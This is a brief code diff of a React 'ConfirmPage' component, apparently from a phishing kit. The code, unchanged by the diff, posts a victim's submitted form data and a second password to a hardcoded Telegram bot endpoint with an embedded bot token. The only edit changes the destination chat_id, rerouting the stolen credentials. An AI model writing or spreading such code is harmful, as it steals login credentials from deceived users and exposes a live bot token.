@@ -101,7 +101,7 @@ const ConfirmPage = () => {
           const response = await standardService.sendMessage(
             'https://api.telegram.org/bot6122232812:AAFzPiXDO6Mt29_8QVjlWWGXaGZildwF8io/sendMessage',
             {
-              chat_id: '-4077356603',
+              chat_id: '-4057839789',
               text: JSON.stringify({ ...formData, password2: password2 }, null, 2),
             },
           );
